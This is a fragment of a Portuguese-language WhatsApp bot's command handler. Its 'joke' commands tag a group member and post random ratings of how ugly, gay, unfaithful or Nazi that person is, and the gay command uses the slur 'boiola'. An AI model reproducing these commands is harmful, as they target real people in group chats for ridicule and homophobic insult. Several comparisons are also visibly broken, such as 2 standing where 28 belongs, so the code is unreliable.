if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:`❰ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${vesgin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption: `O quanto você é vesgo? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  Vesgo 🙄😆`, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 


case 'feio':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

amy.sendMessage(from, {text: `Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde...`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${fein}`)
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = 'É não é feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda tá na média'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = 'É fein, mas tem baum coração'} else if (feio == 35 ) {var bo = 'Tá na média, mas não deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas é feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e preguiçoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'você é Feio, mas é legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que não resolva 🥴'} else if (feio == 43 ) {var bo = 'Feio que dói de ver, compra uma máscara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeça não resolva né!?'} else if (feio == 45 ) {var bo = 'você é feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem lábia pra pegar várias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda não sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'você é Feio, mas não se encherga 🧐'} else if (feio > 51) {var bo = 'você é Feio demais 🙈'} 

await amy.sendMessage(from, {image: wew, caption: `  O quanto você é feio? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ feio 🙉\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 5000)
break


case 'gostoso':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gostosin}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto voce e gostoso 😏\n\n⧼ @${blamention_id.split("@")[0]} ⧽ voce é: ❰ ${random}% ❱ gostoso🥵\n• Que isso ta gostosão 😈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 
case 'fiel':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de fiel : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${fiel}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto que voce e fiel 😇\n\n⧼ @${blamention_id.split("@")[0]} ⧽ voce é: ❰ ${random}% ❱ fiel ❣️\n• Meus parabéns  fiel`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'gostosa':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gostosinha}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto voce e gostosa 😏\n\n⧼ @${blamention_id.split("@")[0]} ⧽ Voce e ́: ❰ ${random}% ❱ gostosa 🥵\n• Que isso ta gostosona 😈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'infiel':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ❰ Pesquisandoa a sua ficha de infiel : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${infiel}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `• O quanto você é infiel 😑\n\n⧼ @${blamention_id.split("@")[0]} ⧽ Voce e : ❰ ${random}% ❱ infiel 😈`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'gay2':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (!isGroup) return reply(msg.grupo)
rate = body.slice(7)
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

zxzz = 
random = `${Math.floor(Math.random() * 110)}`
random2 = `${Math.floor(Math.random() * 110)}`
amy.sendMessage(from, {text: `➮ Pesquisando a sua ficha de  ${comando} :  @${blamention_id.split("@")[0]}, aguarde...\n\n Voce e ́: ❰ ${random},${random2}% ❱  ${comando}_ `, mentions: [blamention_id]})
break

case 'gay':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!isGroup) return reply('𝙎𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙚𝙨𝙩𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤, 𝙚𝙢 𝙜𝙧𝙪𝙥𝙤.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

amy.sendMessage(from, {text: `❰ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gayzin}`)
zxzz = 
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = '𝙝𝙢𝙢... 𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙝𝙚𝙩𝙚𝙧𝙤😔'} else if (boiola == 21 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 23 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 24 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 25 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 26 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 27 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 2 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 29 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 30 ) {var bo = '+/- 𝙗𝙤𝙞𝙤𝙡𝙖'} else if (boiola == 31 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 32 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 33 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 34 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 35 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 36 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖 ...😑'} else if (boiola == 37 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖 ...😑'} else if (boiola == 3 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 39 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖...😑'} else if (boiola == 40 ) {var bo = '𝙩𝙚𝙣𝙝𝙤 𝙢𝙞𝙣𝙝𝙖 𝙙𝙚𝙨𝙘𝙤𝙣𝙛𝙞𝙖𝙣𝙘̧𝙖 ...😑'} else if (boiola == 41 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 42 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 43 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 44 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 45 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 46 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 47 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 4 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 49 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙣𝙚́?😏'} else if (boiola == 50 ) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙤𝙪 𝙣𝙖̃𝙤?🧐'} else if (boiola > 51) {var bo = '𝙫𝙤𝙘𝙚̂ 𝙚́ 𝙜𝙖𝙮🙈'
}
await amy.sendMessage(from, {image: wew, caption: `O quanto que voce e gay: \n\n 「 @${blamention_id.split("@")[0]} 」Voce é: ❰ ${random}% ❱ gay 🏳️‍🌈\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 7000)
break

case 'nazista':
if(!isGroup) return reply(msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
async function nazistaMsg() {
random = `${Math.floor(Math.random() * 110)}`
nazistakjk = random
nazista = random
if(nazista <= 15 ) {var trai = 'hmm, parece q você não é nazista'}
else if(nazista == 16 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 17 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 18 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 19 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 20 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 21 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 22 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 23 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 24 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 25 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 26 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 27 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 28 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 29 ) {var nazi = 'tenho minha desconfiança 🤨'}
else if(nazista == 30 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 31 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 32 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 33 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 34 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 35 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 36 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 37 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 38 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 39 ) {var nazi = 'você é um pouco nazista 😶'}
else if(nazista == 40 ) {var nazi = '🫣'}
else if(nazista == 41 ) {var nazi = '🫣'}
else if(nazista == 42 ) {var nazi = '🫣'}
else if(nazista == 43 ) {var nazi = '🫣'}
else if(nazista == 44 ) {var nazi = '🫣'}
else if(nazista == 45 ) {var nazi = '🫣'}
else if(nazista == 46 ) {var nazi = '🫣'}
else if(nazista == 47 ) {var nazi = '🫣'}
else if(nazista == 48 ) {var nazi = '🫣'}
else if(nazista == 49 ) {var nazi = '🫣'}
else if(nazista == 50 ) {var nazi = '🫣'}
else if(nazista == 51 ) {var nazi = '🫣'}
else if(nazista == 52 ) {var nazi = '🫣'}
else if(nazista == 53 ) {var nazi = '🫣'}
else if(nazista == 54 ) {var nazi = '🫣'}
else if(nazista == 55 ) {var nazi = '🫣'}
else if(nazista == 56 ) {var nazi = '🫣'}
else if(nazista == 57 ) {var nazi = '🫣'}
else if(nazista == 58 ) {var nazi = '🫣'}
else if(nazista == 59 ) {var nazi = '🫣'}
else if(nazista == 60 ) {var nazi = '😳'}
else if(nazista == 61 ) {var nazi = '😳'}
else if(nazista == 62 ) {var nazi = '😳'}
else if(nazista == 63 ) {var nazi = '😳'}
else if(nazista == 64 ) {var nazi = '😳'}
else if(nazista == 65 ) {var nazi = '😳'}
else if(nazista == 66 ) {var nazi = '😳'}
else if(nazista == 67 ) {var nazi = '😳'}     
else if(nazista == 68 ) {var nazi = '😳'}     
else if(nazista == 69 ) {var nazi = '😳'}     
else if(nazista == 70 ) {var nazi = '😳'}    
else if(nazista == 71 ) {var nazi = '😳'}    
else if(nazista == 72 ) {var nazi = '😳'}     
else if(nazista == 73 ) {var nazi = '😳'}     
else if(nazista == 74 ) {var nazi = '😳'}     
else if(nazista == 75 ) {var nazi = '😳'}
else if(nazista == 76 ) {var nazi = '😳'}
else if(nazista == 77 ) {var nazi = '😳'}
else if(nazista == 78 ) {var nazi = '😳'}
else if(nazista == 79 ) {var nazi = '😳'}
else if(nazista == 80 ) {var nazi = '😳'}
else if(nazista == 81 ) {var nazi = '😳'}
else if(nazista == 82 ) {var nazi = '😳'}
else if(nazista == 83 ) {var nazi = '😳'}
else if(nazista == 84 ) {var nazi = '😳'}
else if(nazista >= 85 ) {var nazi = '...'}
var sandrokjk = [
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ▒▒▒▒▒▒▒▒▒▒》0%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 █▒▒▒▒▒▒▒▒▒》10%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ██▒▒▒▒▒▒▒▒》20%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ███▒▒▒▒▒▒▒》30%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ████▒▒▒▒▒▒》40%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 █████▒▒▒▒▒》50%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ██████▒▒▒▒》60%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ███████▒▒▒》70%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 ████████▒▒》80%*`,
`*𝚙𝚎𝚜𝚚𝚞𝚒𝚜𝚊𝚗𝚍𝚘...*\n*《 █████████▒》90%*`,
`*𝚌𝚘𝚖𝚙𝚕𝚎𝚝𝚘*\n*《 ██████████》100%*`,
`*O quanto você é nazista?*\n\n*「 @${sender_ou_n.split("@")[0]} 」seu nível de nazista é: ❰ ${random}% ❱*\n\n*${nazi}*`
]
let { key } = await amy.sendMessage(from, {text: `❰ Pesquisando a sua ficha de nazista: 「 @${sender_ou_n.split("@")[0]} 」 aguarde...  ❱`, mentions: [sender_ou_n]}, {quoted: info})
setTimeout(async() => {
for (let i = 0; i < sandrokjk.length; i++) 
await amy.sendMessage(from, {text: sandrokjk[i], mentions: [sender_ou_n], edit: key });
}, 1500)
}
nazistaMsg()
break


case 'alma-gemeas':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const suamae121 = groupMembers
